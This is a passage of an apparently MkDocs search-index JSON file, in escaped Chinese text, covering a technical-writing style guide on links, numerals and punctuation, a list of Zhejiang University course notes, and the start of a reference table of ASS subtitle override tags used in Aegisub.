</ul>"},{"location":"devops/typesetting/tech/#_21","title":"\u94fe\u63a5","text":"<ul> <li>\u94fe\u63a5\u63cf\u8ff0\u5fc5\u987b\u80fd\u6982\u62ec\u6240\u94fe\u6587\u6863\u6216\u9875\u9762\u7684\u5927\u81f4\u5185\u5bb9\uff0c\u8fd9\u6709\u5229\u4e8e\u641c\u7d22\u5f15\u64ce\u4f18\u5316<ul> <li>\u6bd4\u5982\u4e0d\u80fd\u51fa\u73b0\uff1a\u70b9\u51fb\u8fd9\u91cc</li> </ul> </li> <li>\u540c\u7c7b\u578b\u7684\u94fe\u63a5\u63cf\u8ff0\u5e94\u5c3d\u91cf\u7edf\u4e00\u98ce\u683c</li> <li>\u5982\u94fe\u81f3\u5176\u4ed6\u76f8\u90bb\u6587\u6863\uff0c\u4e14\u94fe\u63a5\u7684\u6587\u6863\u7bc7\u5e45\u8f83\u957f\uff0c\u5efa\u8bae\u94fe\u63a5\u81f3\u951a\u70b9</li> <li>\u4e0d\u5efa\u8bae\u6df7\u7528\u76f8\u5bf9\u8def\u5f84\u548c\u7edd\u5bf9\u8def\u5f84</li> <li>\u5efa\u8bae\u51cf\u5c11\u5c06\u7528\u6237\u94fe\u81f3\u5916\u90e8\u7ad9\u70b9\u7684\u6b21\u6570\uff0c\u4ee5\u514d\u5916\u90e8\u7ad9\u70b9\u7684\u9875\u9762\u5931\u6548\u800c\u5f71\u54cd\u7528\u6237\u4f53\u9a8c</li> <li>\u5982\u679c\u5fc5\u987b\u5c06\u7528\u6237\u94fe\u81f3\u5916\u90e8\u7ad9\u70b9\uff0c\u5efa\u8bae\u5728\u8be5\u5916\u94fe\u540e\u52a0\u4e0a\u660e\u663e\u7684\u6807\u793a\uff0c\u63d0\u9192\u7528\u6237\u8be5\u94fe\u63a5\u5c06\u524d\u5f80\u5916\u90e8\u7ad9\u70b9</li> </ul>"},{"location":"devops/typesetting/tech/#_22","title":"\u5f15\u7528","text":"<ul> <li>\u5f53\u67d0\u5185\u5bb9\u5728\u5176\u4ed6\u5730\u65b9\u5df2\u7ecf\u8be6\u7ec6\u63cf\u8ff0\u8fc7\u3001\u4e0d\u9002\u5408\u5728\u6b63\u6587\u4e2d\u518d\u6b21\u4ecb\u7ecd\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5f15\u7528</li> <li>\u5bf9\u4e8e\u5fc5\u987b\u5f15\u7528\u4f46\u5185\u5bb9\u5f88\u5c11\uff08\u5c11\u4e8e 100 \u5b57\uff09\u7684\u60c5\u51b5\uff0c\u5efa\u8bae\u76f4\u63a5\u5728\u8be5\u5904\u91cd\u65b0\u63cf\u8ff0\u4e00\u904d</li> <li>\u5fc5\u987b\u4fdd\u8bc1\u5f15\u7528\u7684\u4f4d\u7f6e\u51c6\u786e\u3002</li> <li>\u5f15\u7528\u7b2c\u4e09\u65b9\u5185\u5bb9<ul> <li>\u5f15\u7528\u4ed6\u4eba\u7684\u8bed\u53e5\u65f6\uff0c\u5e94\u6ce8\u660e\u51fa\u5904</li> <li>\u5168\u7bc7\u8f6c\u8f7d\u65f6\uff0c\u5e94\u5728\u5168\u6587\u5f00\u5934\u663e\u8457\u4f4d\u7f6e\u6ce8\u660e\u4f5c\u8005\u548c\u51fa\u5904\uff0c\u5e76\u94fe\u63a5\u81f3\u539f\u6587</li> <li>\u4f7f\u7528\u5916\u90e8\u56fe\u7247\u65f6\uff0c\u5fc5\u987b\u5728\u56fe\u7247\u4e0b\u65b9\u6216\u6587\u672b\u6807\u660e\u6765\u6e90</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/#_23","title":"\u7f29\u7565\u8bed","text":"<ul> <li>\u4fdd\u8bc1\u6c49\u8bed\u7f29\u7565\u8bed\u901a\u4fd7\u6613\u61c2\u3001\u4e0d\u9020\u6210\u6b67\u4e49\uff0c\u539f\u5219\u4e0a\u4e0d\u9650\u5236\u4f7f\u7528\u6b21\u6570</li> <li>\u5982\u679c\u67d0\u8bcd\u5728\u6587\u6863\u4e2d\u5fc5\u987b\u5927\u91cf\u4f7f\u7528\uff0c\u4f46\u5176\u7f29\u7565\u8bed\u4e0d\u5e38\u89c1\uff0c\u5efa\u8bae\u5728\u8be5\u8bcd\u7b2c\u4e00\u6b21\u51fa\u73b0\u65f6\u8bf4\u660e\u60c5\u51b5\uff0c\u63d0\u793a\u8bfb\u8005\u4e0b\u6587\u4e2d\u5c06\u4ee5\u7f29\u7565\u8bed\u7684\u5f62\u5f0f\u79f0\u547c\u8be5\u8bcd</li> <li>\u7981\u6b62\u4f7f\u7528\u4e0d\u89c4\u8303\u7684\u7f29\u7565\u8bed</li> <li>\u4e0d\u5efa\u8bae\u5728\u6807\u9898\u4e2d\u89e3\u91ca\u82f1\u6587\u7f29\u7565\u8bed\uff0c\u4ee5\u514d\u9020\u6210\u6807\u9898\u5197\u957f</li> </ul>"},{"location":"devops/typesetting/tech/#_24","title":"\u6570\u5b57","text":"<ul> <li>\u9009\u7528\u963f\u62c9\u4f2f\u6570\u5b57<ul> <li>\u7528\u4e8e\u8ba1\u91cf\uff08\u5373\u7528\u4e8e\u52a0\u3001\u51cf\u3001\u4e58\u3001\u9664\u7b49\u6570\u5b66\u8fd0\u7b97\uff09\u7684\u6570\u5b57</li> <li>\u5f53\u6570\u503c\u4f34\u968f\u6709\u8ba1\u91cf\u5355\u4f4d\u65f6</li> <li>\u7528\u4e8e\u7f16\u53f7\u7684\u6570\u5b57</li> <li>\u5e0c\u671b\u7a81\u51fa\u7b80\u6d01\u9192\u76ee\u7684\u8868\u8fbe\u6548\u679c\u65f6</li> </ul> </li> <li>\u9009\u7528\u6c49\u5b57\u6570\u5b57<ul> <li>\u6570\u5b57\u8fde\u7528\u8868\u793a\u7684\u6982\u6570\u3001\u542b\u201c\u51e0\u201d\u7684\u6982\u6570\u7b49\uff08\u5982\u4e09\u56db\u4e2a\u6708\uff09</li> <li>\u5e72\u652f\u7eaa\u5e74\u3001\u519c\u5386\u6708\u65e5\u3001\u5386\u53f2\u671d\u4ee3\u7eaa\u5e74\u53ca\u5176\u4ed6\u4f20\u7edf\u4e0a\u91c7\u7528\u6c49\u5b57\u5f62\u5f0f\u7684\u975e\u516c\u5386\u7eaa\u5e74</li> <li>\u6c49\u8bed\u4e2d\u957f\u671f\u4f7f\u7528\u4e14\u5df2\u7a33\u5b9a\u4e0b\u6765\u7684\u5305\u542b\u6c49\u5b57\u6570\u5b57\u5f62\u5f0f\u7684\u8bcd\u8bed</li> <li>\u5e0c\u671b\u7a81\u51fa\u5e84\u91cd\u5178\u96c5\u7684\u8868\u8fbe\u6548\u679c\u65f6</li> </ul> </li> <li>\u5728\u540c\u4e00\u573a\u666f\u51fa\u73b0\u7684\u6570\u5b57\uff0c\u5e94\u9075\u5faa\u201c\u540c\u7c7b\u522b\u540c\u5f62\u5f0f\u201d\u539f\u5219\u6765\u9009\u62e9\u6570\u5b57\u7684\u5f62\u5f0f</li> <li>\u5e94\u907f\u514d\u76f8\u90bb\u7684\u4e24\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\u9020\u6210\u6b67\u4e49\u7684\u60c5\u51b5</li> <li>\u6709\u6cd5\u5f8b\u6548\u529b\u7684\u6587\u4ef6\u3001\u516c\u544a\u6587\u4ef6\u6216\u8d22\u52a1\u6587\u4ef6\u4e2d\u53ef\u540c\u65f6\u91c7\u7528\u6c49\u5b57\u6570\u5b57\u548c\u963f\u62c9\u4f2f\u6570\u5b57</li> </ul>"},{"location":"devops/typesetting/tech/#_25","title":"\u963f\u62c9\u4f2f\u6570\u5b57\u683c\u5f0f","text":"<ul> <li>\u6570\u5b57\u4e0e\u82f1\u6587\u5b57\u6bcd\u4e00\u6837\uff0c\u4e00\u5f8b\u4f7f\u7528\u534a\u89d2\u5f62\u5f0f</li> <li>\u5728\u4e0d\u4f5c\u4efb\u4f55\u540e\u671f\u6392\u7248\u5904\u7406\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u534a\u89d2\u6570\u5b57\u4e24\u65c1\u5404\u7a7a\u4e00\u4e2a\u7a7a\u683c</li> <li>\u4e00\u4e2a\u7528\u963f\u62c9\u4f2f\u6570\u5b57\u4e66\u5199\u7684\u6570\u503c\u5fc5\u987b\u5728\u540c\u4e00\u884c\u4e2d\uff0c\u4e0d\u80fd\u65ad\u5f00\u79fb\u884c</li> <li>\u6570\u503c\u5de8\u5927\u7684\u7cbe\u786e\u6570\u5b57\uff0c\u5efa\u8bae\u4f7f\u7528\u201c\u4ebf\u3001\u4e07\u201d\u4f5c\u5355\u4f4d</li> <li>\u6570\u503c\u4e3a\u5343\u4f4d\u4ee5\u4e0a\uff0c\u5efa\u8bae\u6dfb\u52a0\u534a\u89d2\u9017\u53f7\u201c,\u201d\u4f5c\u4e3a\u5206\u8282\u7b26</li> <li>\u5728\u8868\u793a\u6570\u503c\u7684\u8303\u56f4\u65f6\uff0c\u53ef\u91c7\u7528\u6d6a\u7eb9\u5f0f\u8fde\u63a5\u53f7\u201c\uff5e\u201d\u6216\u4e00\u5b57\u7ebf\u8fde\u63a5\u53f7\u201c\u2014\u201d</li> <li>\u524d\u540e\u4e24\u4e2a\u6570\u503c\u7684\u9644\u52a0\u7b26\u53f7\u6216\u8ba1\u91cf\u5355\u4f4d\u76f8\u540c\u65f6\uff0c\u5728\u4e0d\u9020\u6210\u6b67\u4e49\u7684\u60c5\u51b5\u4e0b\uff0c\u524d\u4e00\u4e2a\u6570\u503c\u7684\u9644\u52a0\u7b26\u53f7\u6216\u8ba1\u91cf\u5355\u4f4d\u53ef\u7701\u7565</li> </ul>"},{"location":"devops/typesetting/tech/#_26","title":"\u6c49\u5b57\u6570\u5b57\u683c\u5f0f","text":"<ul> <li>\u4e24\u4e2a\u6570\u5b57\u8fde\u7528\u8868\u793a\u6982\u6570\u65f6\uff0c\u5efa\u8bae\u4e24\u6570\u4e4b\u95f4\u4e0d\u7528\u987f\u53f7\u9694\u5f00</li> <li>\u5e74\u4efd\u7b80\u5199\u540e\u7684\u6570\u5b57\u53ef\u4ee5\u7406\u89e3\u4e3a\u6982\u6570\u65f6\uff0c\u4e00\u822c\u4e0d\u7b80\u5199\uff08\u4f8b\u5982\u201c\u4e00\u4e5d\u4e03\u516b\u5e74\u201d\u4e0d\u5199\u4e3a\u201c\u4e03\u516b\u5e74\u201d\uff09</li> <li>\u201c\u96f6\u201d\u4e0e\u201c\u3007\u201d<ul> <li>\u4e00\u4e2a\u6570\u5b57\u7528\u4e8e\u8ba1\u91cf\u65f6\uff0c\u5efa\u8bae\u7528\u201c\u96f6\u201d</li> <li>\u7528\u4e8e\u7f16\u53f7\u65f6\uff0c\u5efa\u8bae\u7528\u201c\u3007\u201d\uff08\u5982\u5e74\u4efd\uff09</li> </ul> </li> <li>\u201c\u4e8c\u201d\u4e0e\u201c\u4e24\u201d<ul> <li>\u201c\u4e8c\u201d\u201c\u4e24\u201d\u5728\u5ea6\u91cf\u8861\u5355\u4f4d\u548c\u767e\u5343\u4e07\u524d\u9762\u53ef\u4ee5\u901a\u7528</li> <li>\u5e8f\u6570\u3001\u5206\u6570\u3001\u5c0f\u6570\u7528\u201c\u4e8c\u201d\uff0c\u4e0d\u7528\u201c\u4e24\u201d</li> <li>\u5e38\u7528\u91cf\u8bcd\uff08\u5982\u4e2a\u3001\u672c\u3001\u4ef6\u3001\u56de\u3001\u79cd\u3001\u5929\uff09\u524d\u9762\uff0c\u7528\u201c\u4e24\u201d\u4e0d\u7528\u201c\u4e8c\u201d</li> <li>\u7528\u201c\u4e8c\u201d\u548c\u201c\u4e24\u201d\u7684\u5730\u65b9\u5982\u679c\u5f3a\u8c03\u8ba1\u91cf\u548c\u7edf\u8ba1\u610f\u4e49\u65f6\u53ef\u4ee5\u7528\u201c2\u201d</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/#_27","title":"\u5355\u4f4d\u7b26\u53f7","text":"<ul> <li>\u5efa\u8bae\u7528\u6c49\u5b57\u540d\u79f0\u4ee3\u66ff\u5355\u4f4d\u7b26\u53f7</li> <li>\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6570\u503c\u4e0e\u5355\u4f4d\u7b26\u53f7\u4e4b\u95f4\u9700\u8981\u7a7a\u4e00\u4e2a\u534a\u89d2\u7a7a\u683c</li> </ul>"},{"location":"devops/typesetting/tech/#_28","title":"\u6807\u70b9\u7b26\u53f7","text":"<p>\u4e2d\u6587\u6807\u70b9\u7b26\u53f7\u6309\u7167\u6b63\u5e38\u6c49\u8bed\u89c4\u8303\u4f7f\u7528\uff0c\u4e0d\u8fc7\u591a\u4ecb\u7ecd\uff0c\u4ee5\u4e0b\u662f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff1a</p> <ul> <li>\u4e2d\u6587\u8bed\u5883\u4e0b\u7684\u6807\u70b9\u7b26\u53f7\u4e00\u5f8b\u4f7f\u7528\u5168\u89d2\u5f62\u5f0f\uff0c\u4e0d\u5f97\u4f7f\u7528\u534a\u89d2\u5f62\u5f0f</li> <li>\u4e2d\u6587\u5168\u89d2\u6807\u70b9\u7b26\u53f7\u4e24\u65c1\u7981\u6b62\u7a7a\u534a\u89d2\u7a7a\u683c</li> <li>\u6ce8\u610f\u907f\u5934\u5c3e\u89c4\u5219</li> </ul>"},{"location":"devops/typesetting/tech/#_29","title":"\u4e2d\u82f1\u6587\u6df7\u6392","text":"<ul> <li>\u4e2d\u6587\u53e5\u5b50\u5185\u5939\u7528\u82f1\u6587\u5355\u8bcd\u6216\u8bcd\u7ec4\u65f6<ul> <li>\u5939\u7528\u7684\u82f1\u6587\u5355\u8bcd\u6216\u8bcd\u7ec4\u53ef\u4e0d\u7528\u4e2d\u6587\u5f15\u53f7\u5305\u88f9</li> <li>\u5982\u679c\u5939\u7528\u7684\u82f1\u6587\u5355\u8bcd\u6216\u8bcd\u7ec4\u672c\u8eab\u5e26\u6709\u82f1\u6587\u6807\u70b9\uff0c\u4fdd\u7559\u5176\u82f1\u6587\u6807\u70b9</li> <li>\u4e2d\u6587\u53e5\u5b50\u53e5\u672b\u5747\u4ee5\u4e2d\u6587\u6807\u70b9\u7b26\u53f7\u7ed3\u5c3e</li> </ul> </li> <li>\u4e2d\u6587\u53e5\u5b50\u5185\u5939\u7528\u82f1\u6587\u53e5\u5b50\u65f6<ul> <li>\u7528\u4e2d\u6587\u5f15\u53f7\u5305\u88f9\u5f15\u7528\u8be5\u82f1\u6587\u53e5\u5b50</li> <li>\u5982\u679c\u5939\u7528\u7684\u82f1\u6587\u53e5\u5b50\u672c\u8eab\u5e26\u6709\u82f1\u6587\u6807\u70b9\uff0c\u4fdd\u7559\u5176\u82f1\u6587\u6807\u70b9</li> <li>\u4e2d\u6587\u53e5\u5b50\u53e5\u672b\u5747\u4ee5\u4e2d\u6587\u6807\u70b9\u7b26\u53f7\u7ed3\u5c3e</li> </ul> </li> <li>\u82f1\u6587\u6807\u9898\u6216\u5f15\u6587\u4e2d\u7ed3\u5c3e\u6807\u70b9<ul> <li>\u7ed3\u5c3e\u95ee\u53f7\u5fc5\u987b\u4fdd\u7559</li> <li>\u7ed3\u5c3e\u53f9\u53f7\u5fc5\u987b\u4fdd\u7559</li> </ul> </li> <li>\u4e2d\u82f1\u6587\u62ec\u53f7\u4f7f\u7528<ul> <li>\u62ec\u53f7\u91cc\u5168\u4e3a\u82f1\u6587\u65f6\u5efa\u8bae\u4f7f\u7528\u534a\u89d2\u62ec\u53f7\uff0c\u5e76\u5728\u62ec\u53f7\u524d\u540e\u5404\u7a7a\u4e00\u4e2a\u534a\u89d2\u7a7a\u683c\uff0c\u62ec\u53f7\u548c\u62ec\u53f7\u5185\u7684\u82f1\u6587\u4e4b\u95f4\u4e0d\u9700\u8981\u7a7a\u683c</li> <li>\u62ec\u53f7\u91cc\u65e2\u6709\u4e2d\u6587\u53c8\u6709\u82f1\u6587\uff08\u5373\u53ea\u8981\u62ec\u53f7\u5185\u5305\u542b\u4efb\u4f55\u4e2d\u6587\uff09\u65f6\u5efa\u8bae\u4f7f\u7528\u5168\u89d2\u62ec\u53f7\uff0c\u62ec\u53f7\u524d\u540e\u4e0d\u7a7a\u683c</li> </ul> </li> <li>\u4e2d\u6587\u53e5\u5b50\u4e2d\u5939\u7528\u82f1\u6587\u4e66\u7c4d\u6216\u62a5\u520a\u540d\u65f6\uff0c\u4e0d\u80fd\u4f7f\u7528\u4e2d\u6587\u4e66\u540d\u53f7\u300a\u300b\uff0c\u800c\u5e94\u4f7f\u7528\u659c\u4f53\u5b57\u8868\u793a\uff0c\u5982\u679c\u65e0\u6cd5\u4f7f\u7528\u659c\u4f53\u5b57\uff0c\u5efa\u8bae\u4f7f\u7528\u4e2d\u6587\u5f15\u53f7\u5305\u88f9\u5f15\u7528</li> <li>\u82f1\u6587\u6587\u7ae0\u7684\u6807\u9898\u7528\u4e2d\u6587\u5f15\u53f7\u5305\u88f9\u5f15\u7528</li> </ul>"},{"location":"devops/typesetting/tech/#_30","title":"\u62fc\u5199","text":"<ul> <li>\u7b80\u4f53\u4e2d\u6587\u548c\u7e41\u4f53\u4e2d\u6587\u4e0d\u80fd\u6df7\u7528</li> <li>\u7981\u6b62\u51fa\u73b0\u4e2d\u82f1\u6587\u9519\u522b\u5b57</li> <li>\u82f1\u6587\u5927\u5c0f\u5199\u5f62\u5f0f<ul> <li>\u82f1\u6587\u5927\u5c0f\u5199\u5f62\u5f0f\u4e0d\u80fd\u5199\u9519</li> <li>\u5f53\u4e2d\u6587\u53e5\u5b50\u4e2d\u5939\u6709\u82f1\u6587\u5355\u8bcd\u6216\u8bcd\u7ec4\u65f6\uff0c\u65e0\u8bba\u8be5\u82f1\u6587\u5355\u8bcd\u6216\u8bcd\u7ec4\u4f4d\u4e8e\u4e2d\u6587\u53e5\u5b50\u7684\u5f00\u5934\u3001\u4e2d\u95f4\u8fd8\u662f\u672b\u5c3e\uff0c\u666e\u901a\u5355\u8bcd\u3001\u8bcd\u7ec4\u5fc5\u987b\u5c0f\u5199\uff0c\u4e13\u6709\u540d\u8bcd\u7b49\u5728\u82f1\u6587\u4e2d\u5fc5\u987b\u5927\u5199\u7684\u5355\u8bcd\u6216\u8bcd\u7ec4\uff0c\u4fdd\u7559\u5176\u5927\u5199\u5f62\u5f0f</li> <li>\u5f53\u4e2d\u6587\u53e5\u5b50\u4e2d\u5939\u6709\u5b8c\u6574\u7684\u82f1\u6587\u53e5\u5b50\u65f6\uff0c\u65e0\u8bba\u8be5\u82f1\u6587\u53e5\u5b50\u4f4d\u4e8e\u4e2d\u6587\u53e5\u5b50\u7684\u5f00\u5934\u3001\u4e2d\u95f4\u8fd8\u662f\u672b\u5c3e\uff0c\u5176\u9996\u5b57\u6bcd\u5747\u4fdd\u7559\u5927\u5199\u5f62\u5f0f</li> </ul> </li> <li>\u540d\u79f0\u4f7f\u7528<ul> <li>\u5bf9\u4e8e\u4e2d\u6587\u8bfb\u8005\u719f\u77e5\u5176\u4e2d\u6587\u5b98\u65b9\u8bd1\u540d\u7684\u516c\u53f8\u3001\u54c1\u724c\u6216\u4ea7\u54c1\u540d\u79f0\uff0c\u53ea\u9700\u7528\u4e2d\u6587\u5b98\u65b9\u8bd1\u540d\u6307\u79f0</li> <li>\u5bf9\u4e8e\u4e2d\u6587\u8bfb\u8005\u4e0d\u719f\u6089\u3001\u4f46\u6709\u4e2d\u6587\u5b98\u65b9\u8bd1\u540d\u7684\u516c\u53f8\u3001\u54c1\u724c\u6216\u4ea7\u54c1\u540d\u79f0\uff0c\u5efa\u8bae\u7528\u201c\u4e2d\u6587\u5b98\u65b9\u8bd1\u540d (\u82f1\u6587\u5b98\u65b9\u540d\u79f0)\u201d\u5f62\u5f0f</li> <li>\u5bf9\u4e8e\u65e0\u4e2d\u6587\u5b98\u65b9\u8bd1\u540d\u7684\u516c\u53f8\u3001\u54c1\u724c\u6216\u4ea7\u54c1\u540d\u79f0\uff0c\u5efa\u8bae\u76f4\u63a5\u7528\u82f1\u6587\u6307\u79f0\uff0c\u4e14\u5fc5\u987b\u4f7f\u7528\u6b63\u786e\u7684\u5927\u5c0f\u5199\u5f62\u5f0f</li> </ul> </li> </ul>"},{"location":"others/","title":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f","text":"<p>Abstract</p> <p>\u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7b14\u8bb0\uff0c\u8fd8\u6709\u5176\u5b83\u4e0d\u597d\u5206\u7c7b\u7684\u4e1c\u897f\uff08\uff1f</p>"},{"location":"others/#table-of-contents","title":"Table of Contents","text":"\u7b14\u8bb0          <ul> <li> ZJU \u8bfe\u7a0b\u624b\u5199\u7b14\u8bb0\u6c47\u603b  229  1 mins              1677235505 </li> </ul> \u5b57\u5e55\u5236\u4f5c\u7cfb\u5217          <ul> <li> ass \u6807\u7b7e  1373  5 mins              1691508495 </li> <li> Aegisub \u81ea\u52a8\u5316  2277  33  8 mins              1691508495 </li> <li> Aegisub \u5361\u62c9 OK \u7279\u6548\u6a21\u677f  3090  14  10 mins              1691508495 </li> <li> ffmpeg \u5957\u4ef6\u4f7f\u7528\u6742\u8bb0  634  6  2 mins              1691508495 </li> </ul> TroubleShooting          <ul> <li> macOS TroubleShooting  662  5  2 mins              1683733808 </li> </ul>"},{"location":"others/notes/","title":"ZJU \u90e8\u5206\u8bfe\u7a0b\u7b14\u8bb0","text":"<p> \u7ea6 225 \u4e2a\u5b57  9 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u90e8\u5206\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\uff08\u4e3b\u8981\u662f\u6570\u7406\u57fa\u7840\u8bfe\u7a0b\uff09\u7684\u624b\u5199\u7b14\u8bb0</p> <p>\u5185\u5bb9\u5927\u591a\u662f \u8003\u8bd5\u5468\u8865\u5929\u7684\u65f6\u5019 \u63d0\u53d6\u7684\u9ad8\u6d53\u5ea6\u6982\u5ff5\u4e00\u7c7b\uff0c\u5927\u6982\u5c31\u662f\u590d\u4e60\u7b14\u8bb0\u5427\uff08</p>"},{"location":"others/notes/#_1","title":"\u81ea\u7136\u79d1\u5b66\u901a\u8bc6\u7c7b","text":"\u6570\u5b66\u5206\u6790\uff08\u7532\uff09I\uff08H\uff09\u7b14\u8bb0 10.8 MB / 12 P / 2022-01-04 <p> \u4e0b\u8f7d</p> \u7ebf\u6027\u4ee3\u6570 I\uff08H\uff09\u7b14\u8bb0 12.4 MB / 12 P / 2022-01-09 <p> \u4e0b\u8f7d</p> \u6570\u5b66\u5206\u6790\uff08\u7532\uff09II\uff08H\uff09\u7b14\u8bb0 16.4 MB / 15 P / 2022-06-13 <p> \u4e0b\u8f7d</p> \u7ebf\u6027\u4ee3\u6570 II\uff08H\uff09\u7b14\u8bb0 8.8 MB / 8 P / 2022-06-17 <p> \u4e0b\u8f7d</p> \u666e\u901a\u7269\u7406\u5b66 I\uff08H\uff09\u7b14\u8bb0 4 MB / 5 P / 2022-06-16 <p> \u4e0b\u8f7d</p> \u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I \u7b14\u8bb0 4.5 MB / 3 P / 2022-06-18 <p> \u4e0b\u8f7d</p> \u666e\u901a\u7269\u7406\u5b66 II\uff08H\uff09\u7b14\u8bb0 7.4 MB / 9 P / 2023-02-18 <p> \u4e0b\u8f7d</p> \u6982\u7387\u8bba\uff08H\uff09\u7b14\u8bb0 4.8 MB / 6 P / 2023-01-05 <p> \u4e0b\u8f7d</p>"},{"location":"others/notes/#_2","title":"\u4e13\u4e1a\u57fa\u7840\u8bfe\u7a0b","text":"\u79bb\u6563\u6570\u5b66\u7406\u8bba\u57fa\u7840\u7b14\u8bb0 8.2 MB / 8 P / 2022-06-09 <p> \u4e0b\u8f7d</p>"},{"location":"others/subs/","title":"\u5b57\u5e55\u5236\u4f5c\u7cfb\u5217","text":"<p>Abstract</p> <p>\u5728\u5b57\u5e55\u7ec4\u7528 Aegisub \u6253 ass \u8f74\u4ee5\u53ca\u7279\u6548\u7684\u65f6\u5019\u5b66\u5230\u7684\u4e1c\u897f\u5408\u96c6\u3002\u4ee5\u53ca\u90e8\u5206\u538b\u5236\u548c\u5e73\u65f6\u81ea\u5df1\u7528 ffmpeg \u5957\u4ef6\u65f6\u7684\u547d\u4ee4\u8bb0\u5f55\u3002</p> <ul> <li>\u6211\u7528\u7684 Aegisub \u7248\u672c\uff1a arch1t3cht/Aegisub\uff08\u66f4\u65b0\u5feb\uff0c\u7279\u6027\u591a\uff09</li> <li>Aegisub \u5b98\u65b9\u6587\u6863\uff1aaegisub.org/docs</li> <li>Aegisub \u90e8\u5206\u6c49\u5316\u6587\u6863\uff1aaegi.vmoe.info/docs/3.2</li> </ul>"},{"location":"others/subs/#table-of-contents","title":"Table of Contents","text":"<ul> <li>ass \u6807\u7b7e</li> <li>Aegisub \u76f8\u5173<ul> <li>Aegisub \u81ea\u52a8\u5316</li> <li>Aegisub \u5361\u62c9 OK \u7279\u6548\u6a21\u677f</li> </ul> </li> <li>ffmpeg \u5957\u4ef6\u4f7f\u7528\u6742\u8bb0</li> </ul>"},{"location":"others/subs/ass/","title":"ass \u6807\u7b7e","text":"<p> \u7ea6 1369 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>ass \u672c\u8eab\u6587\u4ef6\u683c\u5f0f\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\uff0c\u5185\u90e8\u4e3b\u8981\u5185\u5bb9\uff08\u6837\u5f0f\u548c\u5b57\u5e55\uff09\u7c7b\u4f3c csv \u683c\u5f0f\uff08\u9017\u53f7\u5206\u9694\uff09\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc\u7740\u91cd\u8bb0\u5f55\u4e00\u4e0b ass \u5b57\u5e55\u91cc\u9762\u7684\u7279\u6b8a\u6807\u7b7e\u3002</p>"},{"location":"others/subs/ass/#_1","title":"\u666e\u901a\u6807\u7b7e","text":"<p>\u5373\u5199\u5728\u6587\u672c\u4e2d\u7528 \\ \u5f00\u5934\u7684\u6807\u7b7e\uff0c\u5f88\u5c11\uff1a</p> \u6807\u7b7e \u4f5c\u7528 \\N \u786c\u6362\u884c\uff0c\u5373\u76f4\u63a5\u6362\u65b0\u884c\uff08\u4f46 ass \u5e76\u6ca1\u6709\u8c03\u884c\u8ddd\u7684\u65b9\u6cd5\uff09 \\n \u8f6f\u6362\u884c\uff08\u4e0d\u5e38\u7528\uff0c\u4e0d\u89e3\u91ca\uff09 \\h \u786c\u7a7a\u683c\uff0c\u5373\u4e00\u4e2a\u5728\u5f00\u5934\u4e5f\u4e0d\u4f1a\u88ab\u5ffd\u7565\u7684\u534a\u89d2\u7a7a\u683c\u76f4\u63a5\u6253\u534a\u89d2\u7a7a\u683c\u5982\u679c\u5728\u884c\u5f00\u5934\u5219\u4f1a\u88ab\u5ffd\u7565 <p>\u7279\u6548\u6807\u7b7e\u5199\u5728 {} \u5185\uff0c\u6240\u4ee5\u5982\u679c\u8981\u76f4\u63a5\u6253\u5927\u62ec\u53f7\u9700\u8981\u7528 \\ \u8f6c\u4e49\uff0c\u5373 \\{\\}\uff08libass \u652f\u6301\uff09\uff0c\u4f46 aegisub \u5185\u7684\u81ea\u52a8\u5316\u811a\u672c\u7b49\u57fa\u672c\u90fd\u4e0d\u8003\u8651\u8fd9\u79cd\u60c5\u5f62\uff0c\u5373\u4ecd\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a \\ \u540e\u9762\u662f\u4e00\u4e2a\u7a7a\u7684\u7279\u6548\u6807\u7b7e\uff08\u6bd4\u5982 strip tags \u811a\u672c\u4f1a\u5c06 \\{\\} \u76f4\u63a5\u5220\u6210 \\\uff09\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u51fa\u73b0\u3002</p>"},{"location":"others/subs/ass/#_2","title":"\u7279\u6548\u6807\u7b7e","text":"<p>\u5199\u5728 {} \u4e2d\u7684\u6807\u7b7e\uff0c\u4e5f\u9700\u8981\u7528 \\ \u5f00\u5934\uff0c\u7528\u6765\u5b9a\u4e49\u6574\u884c\u5b57\u5e55\u6216\u6807\u7b7e\u540e\u9762\u5185\u5bb9\u7684\u6548\u679c\uff08\u540e\u79f0\u5176\u4e3a\u6574\u884c\u7279\u6548\u548c\u884c\u5185\u7279\u6548\uff09\u3002</p>"},{"location":"others/subs/ass/#_3","title":"\u884c\u5185\u7279\u6548","text":"\u6807\u7b7e \u4f5c\u7528 \\i1 \\i0 \u6253\u5f00/\u5173\u95ed\u659c\u4f53 \\b1 \\b0 \u6253\u5f00/\u5173\u95ed\u7c97\u4f53\uff08\u53ef\u7528 \\b&lt;weight&gt; \u9009\u62e9\u5b57\u91cd\uff09 \\u1 \\u0 \u6253\u5f00/\u5173\u95ed\u4e0b\u5212\u7ebf \\s1 \\s0 \u6253\u5f00/\u5173\u95ed\u5220\u9664\u7ebf \\bord&lt;size&gt; \u8bbe\u7f6e\u8fb9\u6846\u7c97\u7ec6\uff08\u50cf\u7d20\u4e3a\u5355\u4f4d\uff09 \\xbord&lt;size&gt; \\ybord&lt;size&gt; \u5206\u522b\u8bbe\u7f6e x \u548c y \u65b9\u5411\u7684\u8fb9\u6846\u7c97\u7ec6 \\shad&lt;s&gt; \\xshad&lt;s&gt; \\yshad&lt;s&gt; \u8bbe\u7f6e\u9634\u5f71\uff0c\u7c7b\u4f3c bord\uff0c\u6ce8\u610f xshad \u548c 